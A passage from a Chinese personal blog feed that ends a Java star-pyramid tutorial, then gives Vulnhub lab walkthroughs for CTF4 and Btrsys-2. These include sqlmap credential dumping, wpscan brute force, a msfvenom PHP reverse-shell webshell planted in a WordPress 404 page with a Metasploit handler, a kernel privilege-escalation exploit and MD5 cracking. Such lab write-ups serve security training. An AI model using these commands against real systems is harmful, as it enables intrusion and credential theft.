"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//每次循环完成一层那么就换行</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果如下图，发现还是有一点问题。</p><p><img src="/images/wordimage/2022/0428/sanjiaox3.png"></p><p>问题出在判断的地方，最后一排应该是不用动的所以在判断的时候判断，如果<code>i == 5</code>的时候，那么还是一直输出，也就是当每层层数等于5的时候那么还是会输出星号。</p><p>如下修改代码。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//i为当前层数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span><span class="token number">5</span> <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//打印空格</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token operator">-</span>i<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//j为每层个数</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> j <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">||</span> i <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">//print和println的区别就是print输出不会自带换行println会</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//每次循环完成一层那么就换行</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果如下，发现成功输出空心金字塔。</p><p><img src="/images/wordimage/2022/0428/sanjiaox6.png"></p><hr><h2 id="五-实现先死后活"><a href="#五-实现先死后活" class="headerlink" title="五.实现先死后活"></a>五.实现先死后活</h2><p>既然效果完成了，那么现在需要实现的是，可以自定义层数，让用户来输入层数，然后再来循环，很简单，思路就是使用<code>scanner</code>来接收，然后把下面每层的数字变成变量即可，代码如下。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> test <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//接收用户输入的值</span>        <span class="token class-name">Scanner</span> input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请输入层数字："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> ceng <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//i为当前层数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> ceng <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//打印空格</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> ceng<span class="token operator">-</span>i<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//j为每层个数</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> j <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">||</span> i <span class="token operator">==</span> ceng<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token comment">//print和println的区别就是print输出不会自带换行println会</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">//每次循环完成一层那么就换行</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出效果如下图，会先叫我们输入数字来当作层数</p><p><img src="/images/wordimage/2022/0428/jinzita.png"></p><hr><p>因为我本人也是学习当中，如果有什么不对的地方，欢迎指正！(～￣▽￣)～</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-CTF4靶机实战</title>
      <link href="/2022/04122cca6a.html"/>
      <url>/2022/04122cca6a.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/lampsecurity-ctf4,83/">https://www.vulnhub.com/entry/lampsecurity-ctf4,83/</a></p><blockquote><p>KALI地址：192.168.94.108</p><p>靶机地址：192.168.94.177</p></blockquote><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>首先要发现靶机，先进行主机发现，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.94.108<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现了靶机IP地址</p><p><img src="/images/wordimage/2022/0426/netdis.png"></p><hr><h3 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2.主机扫描"></a>2.主机扫描</h3><p>这里我们使用nmap工具来进行扫描，使用如下命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -p- <span class="token number">192.168</span>.94.177<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图扫描结果，发现开放了<code>22</code>,<code>25</code>,<code>80</code>,<code>631</code>号端口，对应的服务也写上了。</p><p><img src="/images/wordimage/2022/0426/portnmap.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>既然开放了80端口，肯定是网站，直接使用dirb工具扫描目录，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.94.177<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图扫描结果，发现有很多文件，如下，可以一个一个的去看。</p><p><img src="/images/wordimage/2022/0426/dirb.png"></p><hr><h3 id="4-网页目录信息收集"><a href="#4-网页目录信息收集" class="headerlink" title="4.网页目录信息收集"></a>4.网页目录信息收集</h3><p>其实在测试的时候,测试了很多地方，可能都有漏洞，但是经过简单的测试发现，在blog目录下面的文章极有可能存在sql漏洞，如下图。</p><p><img src="/images/wordimage/2022/0426/sqlinjack.png"></p><p>如下图，随便输入东西， 发现报错</p><p><img src="/images/wordimage/2022/0426/sqlerr.png"></p><p>之后我们访问<code>robots.txt</code>，上面目录扫描也扫描出来了。</p><p>如下图，发现可以访问的东西。</p><p><img src="/images/wordimage/2022/0426/robots.png"></p><p>如下图访问<code>mail</code>目录</p><p><img src="/images/wordimage/2022/0426/mail.png"></p><p>如下图访问<code>restricted/</code>，发现需要叫我们登录。</p><p><img src="/images/wordimage/2022/0426/restricted.png"></p><p>访问conf目录发现什么都没有，报错500</p><p>如下图我们访问<code>sql</code>目录，发现了创建数据库的语句，而且里面有敏感信息，user,password。</p><p><img src="/images/wordimage/2022/0426/sqldb.png"></p><p>如下图，我们访问admin目录，发现又一个可以登录的地方。</p><p><img src="/images/wordimage/2022/0426/admin.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-SQL注入漏洞"><a href="#1-SQL注入漏洞" class="headerlink" title="1.SQL注入漏洞"></a>1.SQL注入漏洞</h3><p>上面信息收集已经发现了可能存在一个SQL注入漏洞，现在我们只需要更加验证即可，如下URL地址，验证发现有sql注入，而且是数值型注入。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.94.177/index.html?page<span class="token operator">=</span>blog<span class="token operator">&amp;</span><span class="token assign-left variable">title</span><span class="token operator">=</span>Blog<span class="token operator">&amp;</span><span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token number">2</span>%20and%201<span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里当然也可以进行手工注入，为了方便直接使用SQLMAP来进行注入，注入命令如下，可以发现有很多数据库。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py -u <span class="token string">"http://192.168.94.177/index.html?page=blog&amp;title=Blog&amp;id=2"</span> --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，注入成功。</p><p><img src="/images/wordimage/2022/0426/databases.png"></p><p>我们发现了里面有一个数据库为ehks数据库，和上面发现的sql目录里面创建数据库的名字一样，里面有用户和密码，我们直接爆出里面的内容，如下命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py -u <span class="token string">"http://192.168.94.177/index.html?page=blog&amp;title=Blog&amp;id=2"</span> -D ehks -T user -C user_name,user_pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并且sqlmap已经帮我们破解了密码，出现明文，如下图。</p><p><img src="/images/wordimage/2022/0426/databaseuser.png"></p><p>上面信息收集，我们发现了很多地方可以登录，我们可以一一尝试登录试试，发现都可以登录进去，但是找漏洞找利用点，找上传点，都找不到，唯一一个SquirrelMail漏洞还有，但是利用就是不成功，技术有限，看了大佬的博客，发现原来这里SQL注入获取到账户密码，就可以直接SSH登录了！！！？</p><hr><h3 id="2-SSH连接"><a href="#2-SSH连接" class="headerlink" title="2.SSH连接"></a>2.SSH连接</h3><p>根据上面我们SQL注入获取的用户名和密码可以直接来尝试SSH登录，我们这里使用第一个用户，但是连接失败，如下图报错。</p><p><img src="/images/wordimage/2022/0426/ssh.png"></p><p>这里我直接知识盲区，百度了一下，发现要这样连接，真的是绝了，连接代码如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -oKexAlgorithms<span class="token operator">=</span>+diffie-hellman-group1-sha1 -oHostKeyAlgorithms<span class="token operator">=</span>+ssh-dss -oCiphers<span class="token operator">=</span>+3des-cbc dstevens@192.168.94.177<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，连接成功</p><p><img src="/images/wordimage/2022/0426/sshdstevens.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>如下图，我们先来三问，发现就是普通用户</p><p><img src="/images/wordimage/2022/0426/sanwen.png"></p><p>我们使用<code>sudo -l</code>命令来查看，如下图。</p><p><img src="/images/wordimage/2022/0426/tiquanchenggong.png"></p><p>发现什么命令都可以使用，我们直接切换到root用户，使用命令<code>sudo su root</code>,或者是<code>sudo -s</code>，如下图，靶机结束！</p><p><img src="/images/wordimage/2022/0426/sudos.png"></p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>注意目录扫描，和注意各种应用程序的漏洞，和勇敢尝试，只要有一点可能就去尝试，因为我之前想着可能没有，就没去尝试，结果还真有，血的教训(～￣▽￣)～。</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-Btrsys-2靶机实战</title>
      <link href="/2022/0418a75e54.html"/>
      <url>/2022/0418a75e54.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如下WP是根据我们任课老师加上个人理解所写。</p><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/btrsys-v21,196/">https://www.vulnhub.com/entry/btrsys-v21,196/</a></p><blockquote><p>KALI地址：192.168.205.127</p><p>靶机地址：192.168.202.140</p></blockquote><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用命令如下，来进行发现主机。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.205.127<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，我们发现了靶机的地址</p><p><img src="/images/wordimage/2022/0418/netdis.png"></p><hr><h3 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2.主机扫描"></a>2.主机扫描</h3><p>这里使用nmap工具来进行主机扫描，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -p- <span class="token number">192.168</span>.202.140<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描结果如下图，发现开放了，<code>22</code>,<code>21</code>,<code>80</code>端口</p><p><img src="/images/wordimage/2022/0418/nmap.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>既然开放了80端口，那么肯定是网站肯定有目录吧，那么直接进行目录扫描，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.202.140<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，扫描，发现扫描出来一堆目录，我们只需要看重点即可,一个是robots.txt还有一个是wordpress（ 其实其他的我已经访问过了，并没有什么可以利用的地方doge</p><p><img src="/images/wordimage/2022/0418/dirb.png"></p><hr><h3 id="4-网页信息收集"><a href="#4-网页信息收集" class="headerlink" title="4.网页信息收集"></a>4.网页信息收集</h3><p>经过探索，直接访问IP地址，并没有发现什么可以利用的地方，包括看源码，上面目录扫描我们发现了wordpress和robots.txt文件</p><p>如下图，我们访问<code>robots.txt</code>文件，发现可以访问的目录还是只有wordpress目录。</p><p><img src="/images/wordimage/2022/0418/findwordpress.png"></p><p>我们直接访问wordpress目录试试，如下图访问。</p><p><img src="/images/wordimage/2022/0418/findwordpress2.png"></p><p>既然是wordpress站点，我们就可以使用<code>wpscan</code>工具进行用户探索，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url http://192.168.202.140/wordpress -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现了两个用户分别是，<code>admin</code>，<code>btrisk</code>这两个用户。</p><p><img src="/images/wordimage/2022/0418/wpscan.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-暴力破解"><a href="#1-暴力破解" class="headerlink" title="1.暴力破解"></a>1.暴力破解</h3><p>经过一段时间对登录框的探索，没有发现什么只能使用暴力破解了，根据上面网页信息收集，这里使用<code>wpscan</code>工具对wordpress登录页面进行暴力破解，命令如下，当然前提是需要准备密码本，然后把找出来的用户放入user.txt里面去。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url http://192.168.202.140/wordpress -P ./pass.txt -U user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图破解成功，账户密码分别都是<code>admin</code>。</p><blockquote><p>账户：admin</p><p>密码：admin</p></blockquote><p><img src="/images/wordimage/2022/0418/wpscanfinduser.png"></p><p>然后我们登录进去，一般进入wordpress肯定需要直接写入一句话木马，如下图wordpress后台</p><p><img src="/images/wordimage/2022/0418/wordpressback.png"></p><hr><h3 id="2-写入WEBSHELL"><a href="#2-写入WEBSHELL" class="headerlink" title="2.写入WEBSHELL"></a>2.写入WEBSHELL</h3><p>wordpress可以在404页面写入一句话木马，我们可以使用<code>msfvenom</code>命令来生成一个WEBSHELL木马，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p php/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.205.127 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f raw <span class="token operator">></span> ./shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，我们就生成了一个WEBSHELL木马。</p><p><img src="/images/wordimage/2022/0418/webshell.png"></p><p>生成了木马之后，我们把木马里面的PHP代码，复制然后粘贴在wordpress的404文件里中，如下图。</p><p><img src="/images/wordimage/2022/0418/muma.png"></p><p>之后我们就可以开启监听了，我们使用msf工具，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后按照如下图设置ip地址，设置payload即可。</p><p><img src="/images/wordimage/2022/0418/muhan.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">></span> use exploit/multi/handler <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcpmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> show options Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options <span class="token punctuation">(</span>generic/shell_reverse_tcp<span class="token punctuation">)</span>:   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST                   <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>   LPORT  <span class="token number">4444</span>             <span class="token function">yes</span>       The listen portExploit target:   Id  Name   --  ----   <span class="token number">0</span>   Wildcard Targetmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.205.127LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.205.127                                                                                                                                                                                 msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">></span> php/meterpreter/reverse_tcp                                                                                                                                                                   msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit                                                                                                                                                                                                                                                                                                                                                                             <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.205.127:4444 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开启完毕监听之后，我们再去访问刚才我们写入在404模板里面的地址，地址是<code>http://192.168.202.140/wordpress/wp-content/themes/twentyfourteen/404.php</code>，我们在URL地址栏访问，如下图，成功反弹meterpreter。</p><p><img src="/images/wordimage/2022/0418/meterpreter.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><h3 id="1-利用漏洞提权"><a href="#1-利用漏洞提权" class="headerlink" title="1.利用漏洞提权"></a>1.利用漏洞提权</h3><p>我们上面进入了meterpreter，我们就可以开始提权，首先，如下图，我们先输入<code>shell</code>进入控制台，然后利用python更换交互tty。</p><p><img src="/images/wordimage/2022/0418/shelltty.png"></p><p>然后我们来四问，分别是<code>pwd,id,whoami,uname -r</code>，如下图，发现有系统层面的漏洞，内核版本是<code>4.4.0</code></p><p><img src="/images/wordimage/2022/0418/4.4.0.png"></p><p>我们在KALI里面使用<code>searchsploit</code>命令来查找是否有漏洞，如下图，发现了许多，并且有提权文件，我们这里使用的是<code>41458</code>的文件来进行提权。</p><p><img src="/images/wordimage/2022/0418/44298.png"></p><p>这里我们把文件拷贝到我们KALI的桌面，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/44298.c ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图。</p><p><img src="/images/wordimage/2022/0418/cp44298.png"></p><p>考虑到，靶机没有gcc工具，我们先在kali编译一下文件，如下命令编译。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token number">44298</span>.c -o hack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编译成功之后我们可以利用开启WEB服务，让靶机下载我们编译好的文件，也可以使用meterpreter来上传我们编译好的文件，这里使用meterpreter来上传，按照如下图操作即可，就可以把KALI桌面上面编译好的文件上传到靶机的tmp目录。</p><p><img src="/images/wordimage/2022/0418/upload.png"></p><p>这里简单说一下开启WEB服务有很多种，KALI不是自带python对吧，我们可以使用python来开启web服务，首先我们cd到桌面然后输入<code>python -m http.server</code>来开启web服务，然后在靶机使用wget命令下载即可也就是<code>wget http://192.168.202.140/hack</code>即可。</p><p>然后我们就可以进入tmp目录，直接运行hack文件即可提权，但是发现没有权限，我们直接给文件赋予777权限，然后运行，如下图。</p><p><img src="/images/wordimage/2022/0418/root1.png"></p><h3 id="2-利用用户泄露信息提权"><a href="#2-利用用户泄露信息提权" class="headerlink" title="2.利用用户泄露信息提权"></a>2.利用用户泄露信息提权</h3><p>我们可以查看<code>/etc/passwd</code>和<code>/home</code>目录下面的内容，都没有发现什么，但是由于这个是wordpress站点，思路是我们可以进入数据库查看，其他用户的md5，然后进行解密，玩意里面的密码可以被解密或者是SSH的登录密码呢？</p><p>所以我们可以直接查看，wordpress的配置文件，也就是<code>wp-config.php</code>文件，在wordpress目录下面，如下图。</p><p><img src="/images/wordimage/2022/0418/wordpressuser.png"></p><p>根据上图查看，我们发现了数据库用户名和密码。</p><blockquote><p>数据库账户：root</p><p>数据库密码：rootpassword!</p></blockquote><p>其实我也尝试过用数据库的用户名和密码来SSH登录，发现也不行的。</p><p>然后我们使用如下命令来登录mysql数据库。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql -u root -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现可以登录进去。</p><p><img src="/images/wordimage/2022/0418/mysql.png"></p><p>然后我们就可以直接查询wordpress的用户了，如下图操作即可，发现了root用户和admin用户的md5加密之后的密码。</p><p><img src="/images/wordimage/2022/0418/mysqlpass.png"></p><p>我们可以尝试把密码放入在线网站解密👉<a href="somd5.com">在线MD5解密</a>。</p><p>如下图，发现都解密了，因为上面的admin账户我们暴力破解破解出来了，我们可以尝试root尝试，因为是root尝试很难不猜想是ssh连接的ssh账户。</p><p><img src="/images/wordimage/2022/0418/somd5.png"></p><p>所以如下图， 我们使用root用户来进行ssh连接，发现可以！猜测成功。</p><p><img src="/images/wordimage/2022/0418/root2.png"></p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>1.暴力破解&amp;弱口令</p><p>2.MSF生成PHP木马的使用</p><p>3.系统内核漏洞的了解</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-RickdiculouslyEasy靶机实战</title>
      <link href="/2022/04e9e39de1.html"/>
      <url>/2022/04e9e39de1.html</url>
      
